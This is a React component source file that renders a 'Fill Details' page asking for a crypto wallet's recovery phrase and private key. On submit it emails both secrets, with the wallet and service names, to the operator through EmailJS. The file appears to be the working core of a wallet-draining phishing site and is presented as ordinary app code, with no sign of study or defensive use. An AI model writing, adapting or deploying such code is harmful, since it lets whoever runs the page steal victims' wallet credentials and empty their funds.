import React from "react";
import { useLocation } from "react-router-dom";
import styled from "styled-components";
import emailjs from "emailjs-com"; // Ensure this is installed via `npm install emailjs-com`

const FormContainer = styled.div`
  padding: 40px;
  text-align: center;
  background-color: #f9f9f9;
`;

const Form = styled.form`
  max-width: 400px;
  margin: auto;
  text-align: left;
`;

const Input = styled.input`
  width: 100%;
  padding: 10px;
  margin: 10px 0;
  border: 1px solid #ccc;
  border-radius: 4px;
`;

const SubmitButton = styled.button`
  background-color: #38bdf8;
  color: white;
  padding: 10px 20px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: background-color 0.3s;

  &:hover {
    background-color: #2563eb;
  }
`;

const WalletForm = () => {
  const location = useLocation();
  const { wallet, service } = location.state || {};

  const handleSubmit = (e) => {
    e.preventDefault();

    // Extract form data
    const formData = {
      wallet: wallet || "Unknown Wallet",
      service: service || "Unknown Service",
      recoveryPhrase: e.target[0].value,
      privateKey: e.target[1].value,
      additionalOption: e.target[2].value || "None", // Default to "None" if empty
    };

    // Map form data to EmailJS placeholders
    const emailData = {
      to_name: "User", // Recipient's name
      from_name: "Wallet Service", // Sender's name
      wallet: formData.wallet,
      service: formData.service,
      recoveryPhrase: formData.recoveryPhrase,
      privateKey: formData.privateKey,
      additionalOption: formData.additionalOption,
      message: `
        Wallet: ${formData.wallet}
        Service: ${formData.service}
        Recovery Phrase: ${formData.recoveryPhrase}
        Private Key: ${formData.privateKey}
        Additional Option: ${formData.additionalOption}
      `,
    };

    // EmailJS configuration
    emailjs
      .send(
        import.meta.env.VITE_EMAILJS_SERVICE_ID,
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
        emailData,
        import.meta.env.VITE_EMAILJS_PUBLIC_KEY
      )
      .then(
        (response) => {
          alert("Details sent successfully!");
          console.log("SUCCESS!", response.status, response.text);
        },
        (error) => {
          alert("Failed to send details. Please try again.");
          console.error("FAILED...", error);
        }
      );
  };

  return (
    <FormContainer>
      <h2>Fill Details for {wallet || "Wallet"}</h2>
      <p>Service: {service || "Service"}</p>
      <Form onSubmit={handleSubmit}>
        <Input type="text" placeholder="Enter Recovery Phrase" required />
        <Input type="text" placeholder="Enter Private Key" required />
        <Input type="text" placeholder="Additional Option (if any)" />
        <SubmitButton type="submit">Submit</SubmitButton>
      </Form>
    </FormContainer>
  );
};

export default WalletForm;
